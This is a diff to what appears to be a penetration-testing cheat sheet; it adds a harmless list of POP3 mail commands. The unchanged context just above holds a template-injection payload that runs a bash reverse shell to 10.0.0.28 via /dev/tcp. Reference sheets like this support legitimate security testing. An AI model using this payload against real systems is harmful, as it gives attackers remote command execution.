@@ -876,6 +876,22 @@ Decoded:
 ${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}
 ```
 
+## POP Syntax:
+
+```
+POP Commands:
+  USER rosesecurity           Log in as "rosesecurity"
+  PASS password      Substitue "password" for your actual password
+  STAT               List number of messages, total mailbox size
+  LIST               List messages and sizes
+  RETR n             Show message n
+  DELE n             Mark message n for deletion
+  RSET               Undo any changes
+  QUIT               Logout (expunges messages if no RSET)
+  TOP msg n          Show first n lines of message number msg
+  CAPA               Get capabilities
+```
+
  ## SSH Dynamic Port Forwarding:
  
  Forwards one local port to multiple remote hosts; it is useful for accessing multiple systems.
